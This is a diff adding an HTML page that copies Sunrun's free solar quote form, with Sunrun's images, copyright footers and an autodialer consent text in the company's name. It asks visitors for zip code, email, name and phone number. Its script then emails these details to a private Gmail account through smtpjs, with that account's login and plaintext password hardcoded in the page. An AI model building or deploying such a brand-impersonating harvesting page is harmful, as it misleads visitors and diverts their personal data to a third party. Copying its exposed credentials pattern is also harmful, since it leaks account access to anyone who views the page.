@@ -1,0 +1,993 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Source+Serif+Pro:wght@600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
+    <style>
+        body {
+            background: #203447;
+            color: #ffffff;
+            margin: 0;
+            font-family: sans-serif;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        #root__stepNumberHeading {
+            width: 100%;
+        }
+
+        #lineright,
+        #lineLeft {
+            width: 65px;
+            height: 1px;
+            background-color: #fff;
+        }
+
+        #stepNumberHeading__stepNumber {
+            color: white;
+            font-size: 26px;
+            font-weight: 600;
+            text-align: center;
+            border: 2px solid #fff;
+            border-radius: 50%;
+            display: inline-block;
+            width: 35px;
+            height: 35px;
+            line-height: 34px;
+            box-sizing: border-box;
+        }
+
+        #lineright {
+            margin-left: 1em;
+        }
+
+        #lineLeft {
+            margin-right: 1em;
+        }
+
+        @media screen and (min-width:767px) {
+            h2 {
+                font-size: 54px;
+                margin: 48px 0 50px !important;
+            }
+        }
+
+        @media screen and (max-width:767px) {
+            h2 {
+                font-size: 3.2vh;
+                margin: 20px 0.5em !important;
+
+            }
+        }
+
+        h2 {
+            margin: 0;
+            padding: 0;
+            letter-spacing: 1px;
+            font-weight: 500;
+            margin-bottom: 50px;
+            /* width: 100%; */
+            line-height: 1.3;
+            text-align: center;
+            font-family: 'Source Serif Pro', serif;
+        }
+
+        #yes__content>img,
+        #no__content>a>img {
+            filter: brightness(0) invert(1);
+        }
+
+        #yes__content>img:hover,
+        #no__content>a>img:hover {
+            filter: none;
+        }
+
+        #yes__content,
+        #no__content {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #yes__content>p,
+        #no__content>p {
+            font-size: 19px;
+            margin-top: 1em;
+        }
+
+        @media screen and (min-width:767px) {
+            #formContent__ownProperty {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+
+            #yes__content>img,
+            #no__content>a>img {
+                width: 170px;
+                height: auto;
+                cursor: pointer;
+            }
+
+            #no__content {
+                margin-left: 25px;
+            }
+
+            #yes__content {
+                margin-right: 25px;
+            }
+
+            #root__content {
+                padding-top: 11em;
+            }
+
+            #root__contentStepFour {
+                padding-top: 9em;
+            }
+
+            #root__contentStepThree,
+            #root__contentStepFive,
+            #root__contentStepSix {
+                padding-top: 7em;
+            }
+
+            #footer__links {
+                font-size: 10px;
+            }
+
+            #footer__links>p>a {
+                padding: 0 10px;
+            }
+        }
+
+        @media screen and (max-width:767px) {
+            #formContent__ownProperty {
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+            }
+
+            #yes__content>img,
+            #no__content>a>img {
+                width: 100px;
+                height: auto;
+                cursor: pointer;
+            }
+
+            #root__content {
+                padding-top: 8em;
+            }
+
+            #root__contentStepThree,
+            #root__contentStepFour,
+            #root__contentStepFive,
+            #root__contentStepSix {
+                padding-top: 7em;
+            }
+
+            #no__content {
+                margin-top: 45px;
+            }
+
+            #footer__links {
+                font-size: 8px;
+            }
+
+            #footer__links>p>a {
+                padding: 0 10px;
+            }
+        }
+
+        @media screen and (max-width:425px) {
+            #footer__links>p>a {
+                padding: 0 2px;
+            }
+        }
+
+        #root__stepNumberHeading {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        body {
+            overflow-y: hidden;
+        }
+
+        #footer__links {
+            display: flex;
+        }
+
+        p {
+            margin: 0;
+            text-align: center;
+        }
+
+        #footer__copyright {
+            color: #c0c0c0;
+            font-size: 10px;
+            text-align: center;
+        }
+
+        #footer__links>p>a {
+            text-decoration: none;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        #footer__links>p {
+            color: #c0c0c0;
+        }
+
+
+        #footer__links {
+            display: flex;
+            justify-content: center;
+            margin-top: 0.5em;
+        }
+
+        #footer {
+            position: fixed;
+            bottom: 0;
+            padding-bottom: 0.5em;
+            width: 100%;
+        }
+
+        #root,
+        #rootStepThree,
+        #rootStepTwo,
+        #rootStepFour,
+        #rootStepFive,
+        #rootStepSix {
+            height: 100vh;
+        }
+
+        a {
+            text-decoration: none;
+            color: white;
+        }
+
+        #backbutton {
+            display: none;
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            background-color: #304254;
+            width: 30px;
+            height: 30px;
+            /* display: flex; */
+            justify-content: center;
+            align-items: center;
+            margin-right: 1em;
+            margin-bottom: 1em;
+            cursor: pointer;
+        }
+
+        #backbutton>p {
+            margin-top: 7px;
+            font-size: 25px;
+            text-align: center;
+            color: #6c7986;
+        }
+
+        #secondStep,
+        #thirdStep,
+        #forthStep,
+        #fifthStep,
+        #sixthStep {
+            width: 100%;
+            display: none;
+            justify-content: center;
+        }
+
+        .pin_blue,
+        .email_blue,
+        .number_blue {
+            display: none;
+        }
+
+        .pin_blue,
+        .pin_white {
+            width: 32px;
+            height: 45px;
+            margin-bottom: 20px;
+        }
+
+        .email_blue,
+        .email_white {
+            width: 53px;
+            height: 35px;
+            margin-bottom: 20px;
+        }
+
+        .number_blue,
+        .number_white {
+            width: 57px;
+            height: 57px;
+            margin-bottom: 20px;
+        }
+
+        #formContent__zipCode,
+        #formContent__electricBill,
+        #formContent__name {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        @media screen and (min-width:767px) {
+
+            #formContent__zipCode>input,
+            #formContent__electricBill>input,
+            #formContent__name>input {
+                width: 550px;
+                height: 65px;
+                font-size: 24px;
+            }
+        }
+
+        @media screen and (max-width:767px) {
+
+            #formContent__zipCode>input,
+            #formContent__electricBill>input,
+            #formContent__name>input {
+                width: 75%;
+                height: 50px;
+                font-size: 16px;
+            }
+
+            #formContent__zipCode,
+            #formContent__electricBill,
+            #formContent__name {
+                width: 100%;
+            }
+        }
+
+        #formContent__zipCode>input,
+        #formContent__electricBill>input,
+        #formContent__name>input {
+            border: 2px solid #cccccc;
+            text-align: center;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        #formContent__zipCode>input:focus,
+        #formContent__electricBill>input:focus,
+        #formContent__name>input:focus {
+            outline: none;
+        }
+
+        #formContent__zipCode>button,
+        #electricBillButton,
+        #nameButton {
+            width: 90px;
+            cursor: pointer;
+            background-color: #00b085;
+            color: #ffffff;
+            font-size: 20px;
+            padding: 15px;
+            font-weight: 700;
+            border-radius: 100px;
+            text-decoration: none;
+            border: none;
+        }
+
+        #numberButton {
+            width: 270px;
+            height: 56px;
+            cursor: pointer;
+            background-color: #00b085;
+            color: #ffffff;
+            font-size: 20px;
+            padding: 15px;
+            font-weight: 700;
+            border-radius: 100px;
+            text-decoration: none;
+            border: none;
+        }
+
+        #formContent__zipCode>button:hover,
+        #electricBillButton:hover,
+        #nameButton:hover,
+        #numberButton:hover {
+            background: #157245;
+        }
+
+        /* Chrome, Safari, Edge, Opera */
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        /* Firefox */
+        input[type=number] {
+            -moz-appearance: textfield;
+        }
+
+        .sliderText {
+            font-size: 16px;
+            text-align: center;
+            margin-left: 1em;
+            margin-right: 1em;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        #disclaimer {
+            color: #c0c0c0;
+            text-align: center;
+            margin-bottom: 30px;
+            margin-top: 10px;
+            line-height: 1.5;
+        }
+
+        @media screen and (min-width:767px) {
+            #disclaimer {
+                font-size: 11px;
+                max-width: 596px;
+            }
+        }
+
+        @media screen and (max-width:767px) {
+            #disclaimer {
+                font-size: 8px;
+                margin-left: 3em;
+                margin-right: 3em;
+            }
+        }
+    </style>
+
+</head>
+
+<body>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+    <div id="main">
+        <div id="root" class="animate__animated animate__slideInUp">
+            <div id="root__content">
+                <div id="root__stepNumberHeading">
+                    <div id="lineLeft"></div>
+                    <div id="stepNumberHeading__stepNumber">
+                        1
+                    </div>
+                    <div id="lineright"></div>
+                </div>
+                <h2>Do you own your home?</h2>
+                <div id="formContent__ownProperty">
+                    <div id="yes__content">
+                        <img id="houseOwn__yes"
+                            src="https://solarpanels.sunrun.com/free-quote/assets/images/180131/icon_residential-f9b85e53.png"
+                            alt="tick">
+                        <p>Yes</p>
+                    </div>
+                    <div id="no__content">
+                        <a href="#">
+                            <img src="https://solarpanels.sunrun.com/free-quote/assets/images/180131/icon_commercial-9a2c3cdc.png"
+                                alt="">
+                        </a>
+                        <p>No</p>
+                    </div>
+                </div>
+            </div>
+            <div id="footer">
+                <p id="footer__copyright">©2021 Sunrun. All rights reserved.</p>
+                <div id="footer__links">
+                    <p>
+                        <a href="#">State Contractor License information</a>
+                        |
+                        <a href="#">Privacy Policy</a>
+                        |
+                        <a href="#">Do Not Sell My Info</a>
+                        |
+                        <a href="#">Terms</a>
+                    </p>
+                </div>
+            </div>
+        </div>
+        <div id="secondStep">
+            <div id="rootStepTwo" class="animate__animated animate__slideInUp">
+                <div id="root__content">
+                    <div id="root__stepNumberHeading">
+                        <div id="lineLeft"></div>
+                        <div id="stepNumberHeading__stepNumber">
+                            2
+                        </div>
+                        <div id="lineright"></div>
+                    </div>
+                    <h2>What is your zip code?</h2>
+                    <div id="formContent__zipCode">
+                        <img id="pinWhite" class="pin_white" src="./pin_white.png" alt="map pin">
+                        <img id="pinBlue" class="pin_blue" src="./pin_blue.png" alt="map pin">
+                        <input id="zipCodeInput" onblur="zipCodeBlur()" onfocus="zipCodeFocus()"
+                            onchange="zipCodeChange(event)" type="number" pattern="[0-9]{5}"
+                            placeholder="Enter Your Zip Code">
+                        <button onclick="zipcodeButtonClick()" id="zipCodeButton">Next</button>
+                    </div>
+                </div>
+                <div id="footer">
+                    <p id="footer__copyright">©2021 Sunrun. All rights reserved.</p>
+                    <div id="footer__links">
+                        <p>
+                            <a href="#">State Contractor License information</a>
+                            |
+                            <a href="#">Privacy Policy</a>
+                            |
+                            <a href="#">Do Not Sell My Info</a>
+                            |
+                            <a href="#">Terms</a>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="thirdStep">
+            <div id="rootStepThree" class="animate__animated animate__slideInUp">
+                <div id="root__contentStepThree">
+                    <div id="root__stepNumberHeading">
+                        <div id="lineLeft"></div>
+                        <div id="stepNumberHeading__stepNumber">
+                            3
+                        </div>
+                        <div id="lineright"></div>
+                    </div>
+                    <h2>What is Your Average Electric Bill?</h2>
+                    <p class="sliderText">Move the slider to indicate your monthly average electricity bill amount</p>
+                    <div id="formContent__electricBill">
+                        <input class="slider" type="range" min="50" max="800" value="50" class="slider" id="myRange">
+                        <button onclick="gotoEmail()" id="electricBillButton">Next</button>
+                    </div>
+                </div>
+                <div id="footer">
+                    <p id="footer__copyright">©2021 Sunrun. All rights reserved.</p>
+                    <div id="footer__links">
+                        <p>
+                            <a href="#">State Contractor License information</a>
+                            |
+                            <a href="#">Privacy Policy</a>
+                            |
+                            <a href="#">Do Not Sell My Info</a>
+                            |
+                            <a href="#">Terms</a>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="forthStep">
+            <div id="rootStepFour" class="animate__animated animate__slideInUp">
+                <div id="root__contentStepFour">
+                    <div id="root__stepNumberHeading">
+                        <div id="lineLeft"></div>
+                        <div id="stepNumberHeading__stepNumber">
+                            4
+                        </div>
+                        <div id="lineright"></div>
+                    </div>
+                    <h2>Where Can We Send Your Free Solar Quote?</h2>
+                    <div id="formContent__electricBill">
+                        <img id="emailWhite" class="email_white" src="./email_white.png" alt="email icon">
+                        <img id="emailBlue" class="email_blue" src="./email_blue.png" alt="email icon">
+                        <input id="zipCodeInput" onblur="emailBlur()" onfocus="emailFocus()"
+                            onchange="emailChange(event)" type="text" placeholder="Enter Your Email">
+                        <button onclick="emailButtonClick()" id="electricBillButton">Next</button>
+                    </div>
+                </div>
+                <div id="footer">
+                    <p id="footer__copyright">©2021 Sunrun. All rights reserved.</p>
+                    <div id="footer__links">
+                        <p>
+                            <a href="#">State Contractor License information</a>
+                            |
+                            <a href="#">Privacy Policy</a>
+                            |
+                            <a href="#">Do Not Sell My Info</a>
+                            |
+                            <a href="#">Terms</a>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="fifthStep">
+            <div id="rootStepFive" class="animate__animated animate__slideInUp">
+                <div id="root__contentStepFive">
+                    <div id="root__stepNumberHeading">
+                        <div id="lineLeft"></div>
+                        <div id="stepNumberHeading__stepNumber">
+                            5
+                        </div>
+                        <div id="lineright"></div>
+                    </div>
+                    <h2>Who Is This Quote For?</h2>
+                    <p class="sliderText">Please enter your first and last name</p>
+                    <div id="formContent__name">
+                        <input id="firstNameInput" onchange="firstNameChange(event)" type="text"
+                            placeholder="Enter First Name">
+                        <input id="lastNameInput" onchange="lastNameChange(event)" type="text"
+                            placeholder="Enter Last Name">
+                        <button onclick="nameButtonClick()" id="nameButton">Next</button>
+                    </div>
+                </div>
+                <div id="footer">
+                    <p id="footer__copyright">©2021 Sunrun. All rights reserved.</p>
+                    <div id="footer__links">
+                        <p>
+                            <a href="#">State Contractor License information</a>
+                            |
+                            <a href="#">Privacy Policy</a>
+                            |
+                            <a href="#">Do Not Sell My Info</a>
+                            |
+                            <a href="#">Terms</a>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="sixthStep">
+            <div id="rootStepSix" class="animate__animated animate__slideInUp">
+                <div id="root__contentStepSix">
+                    <div id="root__stepNumberHeading">
+                        <div id="lineLeft"></div>
+                        <div id="stepNumberHeading__stepNumber">
+                            6
+                        </div>
+                        <div id="lineright"></div>
+                    </div>
+                    <h2>Phone Number</h2>
+                    <div id="formContent__name">
+                        <img id="numberWhite" class="number_white" src="./number_white.png" alt="number icon">
+                        <img id="numberBlue" class="number_blue" src="./number_blue.png" alt="number icon">
+                        <input id="numberInput" onblur="numberBlur()" onfocus="numberFocus()"
+                            onchange="numberChange(event)" type="tel" pattern="[0-9]{3}-[0-9]{2}-[0-9]{3}"
+                            placeholder="Enter Your Phone Number">
+                        <p id="disclaimer">By clicking below, I authorize Sunrun to call me and send pre-recorded
+                            messages and
+                            text messages to
+                            me about Sunrun products and services at the telephone number I entered above, using an
+                            autodialer,
+                            even if I am on a national or state "Do Not Call" list. Message and data rates may apply.
+                            Maximum 10
+                            texts per month. Consent for calls & texts is optional. You can opt out anytime. You also
+                            agree to
+                            our <a href="#">Terms of Service.</a>
+                        </p>
+                        <button onclick="numberButtonClick()" id="numberButton">Submit ▸</button>
+                    </div>
+                </div>
+
+                <div id="footer">
+                    <p id="footer__copyright">©2021 Sunrun. All rights reserved.</p>
+                    <div id="footer__links">
+                        <p>
+                            <a href="#">State Contractor License information</a>
+                            |
+                            <a href="#">Privacy Policy</a>
+                            |
+                            <a href="#">Do Not Sell My Info</a>
+                            |
+                            <a href="#">Terms</a>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <img id="backbutton" src="./backButton.png" alt="back">
+
+    </div>
+
+    <script>
+        const yes = document.getElementById("houseOwn__yes");
+        const root = document.getElementById("root");
+        const root2 = document.getElementById("rootStepTwo");
+        const root3 = document.getElementById("rootStepThree");
+        const root4 = document.getElementById("rootStepFour");
+        const root5 = document.getElementById("rootStepFive");
+        const secondStep = document.getElementById("secondStep");
+        const main = document.getElementById("main");
+        const backButton = document.getElementById("backbutton");
+        const zipCodeInput = document.getElementById("zipCodeInput");
+        const firstNameInput = document.getElementById("firstNameInput");
+        const lastNameInput = document.getElementById("lastNameInput");
+        const whitePin = document.getElementById("pinWhite");
+        const bluePin = document.getElementById("pinBlue");
+        const whiteEmail = document.getElementById("emailWhite");
+        const blueEmail = document.getElementById("emailBlue");
+        const whiteNumber = document.getElementById("numberWhite");
+        const blueNumber = document.getElementById("numberBlue");
+        const thirdStep = document.getElementById("thirdStep");
+        const forthStep = document.getElementById("forthStep");
+        const fifthStep = document.getElementById("fifthStep");
+        const sixthStep = document.getElementById("sixthStep");
+        const numberInput = document.getElementById("numberInput")
+
+        let data = {
+            zipcode: '',
+            electricBill: '',
+            email: '',
+            firstName: '',
+            lastName: '',
+            phoneNumber: ''
+        }
+
+        function phoneMask() {
+            numberInput.value.replace(/[^\d]/g, "");
+            let num = numberInput.value.replace(/[^\d]/g, "");
+            numberInput.value =
+                "(" +
+                num.substring(0, 3) +
+                ")" +
+                num.substring(3, 6) +
+                "-" +
+                num.substring(6, 10);
+        }
+        numberInput.addEventListener('keyup', () => {
+            phoneMask();
+        });
+
+        function zipCodeMask() {
+            let num = zipCodeInput.value;
+            zipCodeInput.value = num.substring(0, 5);
+        }
+        zipCodeInput.addEventListener('keyup', () => {
+            zipCodeMask();
+        });
+
+        yes.onclick = function () {
+            root.style.display = 'none'
+            secondStep.style.display = "block";
+            backButton.style.display = "block";
+        }
+
+        backButton.onclick = function () {
+
+            if (thirdStep.style.display === "block") {
+                root.style.display = 'none'
+                secondStep.style.display = "block";
+                thirdStep.style.display = "none";
+                root2.classList.remove("animate__slideInUp");
+                root2.classList.add("animate__slideInDown");
+                root.classList.remove("animate__slideInDown");
+                root.classList.add("animate__slideInUp");
+            } else if (forthStep.style.display === "block") {
+                root.style.display = 'none'
+                secondStep.style.display = "none";
+                thirdStep.style.display = "block";
+                forthStep.style.display = "none";
+                root3.classList.remove("animate__slideInUp");
+                root3.classList.add("animate__slideInDown");
+                root2.classList.remove("animate__slideInDown");
+                root2.classList.add("animate__slideInUp");
+                root.classList.remove("animate__slideInDown");
+                root.classList.add("animate__slideInUp");
+            } else if (fifthStep.style.display === "block") {
+                root.style.display = 'none'
+                secondStep.style.display = "none";
+                thirdStep.style.display = "none";
+                forthStep.style.display = "block";
+                fifthStep.style.display = "none";
+                root4.classList.remove("animate__slideInUp");
+                root4.classList.add("animate__slideInDown");
+                root3.classList.remove("animate__slideInDown");
+                root3.classList.add("animate__slideInUp");
+                root2.classList.remove("animate__slideInDown");
+                root2.classList.add("animate__slideInUp");
+                root.classList.remove("animate__slideInDown");
+                root.classList.add("animate__slideInUp");
+            } else if (sixthStep.style.display === "block") {
+                root.style.display = 'none'
+                secondStep.style.display = "none";
+                thirdStep.style.display = "none";
+                forthStep.style.display = "none";
+                fifthStep.style.display = "block";
+                sixthStep.style.display = "none";
+                root5.classList.remove("animate__slideInUp");
+                root5.classList.add("animate__slideInDown");
+                root4.classList.remove("animate__slideInDown");
+                root4.classList.add("animate__slideInUp");
+                root3.classList.remove("animate__slideInDown");
+                root3.classList.add("animate__slideInUp");
+                root2.classList.remove("animate__slideInDown");
+                root2.classList.add("animate__slideInUp");
+                root.classList.remove("animate__slideInDown");
+                root.classList.add("animate__slideInUp");
+            } else {
+                backButton.style.display = 'none'
+                root.classList.remove("animate__slideInUp");
+                root.classList.add("animate__slideInDown");
+                root.style.display = 'block'
+                secondStep.style.display = "none";
+                root2.classList.remove("animate__slideInDown");
+                root2.classList.add("animate__slideInUp");
+                root3.classList.remove("animate__slideInDown");
+                root3.classList.add("animate__slideInUp");
+                root4.classList.remove("animate__slideInDown");
+                root4.classList.add("animate__slideInUp");
+                root5.classList.remove("animate__slideInDown");
+                root5.classList.add("animate__slideInUp");
+            }
+
+        }
+
+        function zipCodeFocus() {
+            bluePin.style.display = "block";
+            whitePin.style.display = 'none';
+        }
+
+        function emailFocus() {
+            blueEmail.style.display = "block";
+            whiteEmail.style.display = 'none';
+        }
+
+        function numberFocus() {
+            blueNumber.style.display = "block";
+            whiteNumber.style.display = 'none';
+        }
+
+        function zipCodeBlur() {
+            bluePin.style.display = "none";
+            whitePin.style.display = 'block';
+        }
+
+        function emailBlur() {
+            blueEmail.style.display = "none";
+            whiteEmail.style.display = 'block';
+        }
+
+        function numberBlur() {
+            blueNumber.style.display = "none";
+            whiteNumber.style.display = 'block';
+        }
+
+        function zipCodeChange(e) {
+            data.zipcode = e.target.value;
+        }
+
+        function emailChange(e) {
+            data.email = e.target.value;
+        }
+
+        function firstNameChange(e) {
+            data.firstName = e.target.value;
+        }
+
+        function lastNameChange(e) {
+            data.lastName = e.target.value;
+        }
+
+        function numberChange(e) {
+            data.phoneNumber = e.target.value;
+        }
+
+        function zipcodeButtonClick() {
+            if (data.zipcode === '') {
+                alert(`
+Please correct the following errors:
+
+- Please enter you zip code`);
+            }
+            else if (data.zipcode.length < 5 || data.zipcode.length > 5) {
+                alert(`
+Please correct the following errors:
+
+- Please enter a valid zip code`);
+            } else {
+                root.style.display = 'none';
+                secondStep.style.display = "none";
+                thirdStep.style.display = "block";
+            }
+        }
+
+        function emailButtonClick() {
+            if (data.email.match(/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/)) {
+                root.style.display = 'none';
+                secondStep.style.display = "none";
+                thirdStep.style.display = "none";
+                forthStep.style.display = "none";
+                fifthStep.style.display = "block";
+            } else if (data.email === '') {
+                alert(`
+Please correct the following errors:
+
+- Please enter a email address`);
+            } else {
+                alert(`
+Please correct the following errors:
+
+- Please enter a valid email address`);
+            }
+        }
+
+        function gotoEmail() {
+            root.style.display = 'none';
+            secondStep.style.display = "none";
+            thirdStep.style.display = "none";
+            forthStep.style.display = "block";
+        }
+
+        function nameButtonClick() {
+            let firstName = '';
+            let lastName = '';
+
+            const regex = /\d/;
+
+            if (data.firstName === '') {
+                firstName = '- Please enter your first name';
+            } else if (regex.test(data.firstName)) {
+                firstName = '- Please enter a valid first name';
+            }
+
+            if (data.lastName === '') {
+                lastName = '- Please enter your last name';
+            } else if (regex.test(data.lastName)) {
+                lastName = '- Please enter a valid last name';
+            }
+
+            if (firstName === '' && lastName !== '') {
+                alert(`
+Please correct the following errors:
+
+${lastName}`);
+            } else if (firstName !== '' && lastName === '') {
+                alert(`
+Please correct the following errors:
+
+${firstName}`);
+            } else if (firstName !== '' && lastName !== '') {
+                alert(`
+Please correct the following errors:
+
+${firstName}
+${lastName}`);
+            } else if (firstName === '' && lastName === '') {
+                sixthStep.style.display = 'block';
+                fifthStep.style.display = 'none';
+            }
+
+        }
+        function numberButtonClick() {
+            if (data.phoneNumber !== '' && data.phoneNumber.length === 13) {
+                let string =
+                    `Postal Code: ${data.zipcode},
+            Email: ${data.email},
+            First Name: ${data.firstName},
+            Last Name: ${data.lastName},
+            Phone Number: ${data.phoneNumber}`
+
+                Email.send({
+                    Host: "smtp.gmail.com",
+                    Username: "hasnainmhddn@gmail.com",
+                    Password: "Hasnain120",
+                    To: 'hasnainmhddn@gmail.com',
+                    From: "hasnainmhddn@gmail.com",
+                    Subject: "Form Data",
+                    Body: string,
+                })
+            } else if (data.phoneNumber === '') {
+                alert(`
+Please correct the following errors:
+
+- Please enter your phone number`);
+            } else {
+                alert(`
+Please correct the following errors:
+
+- Please enter a valid phone number`);
+            }
+        }
+
+    </script>
+
+</body>
+
+</html>
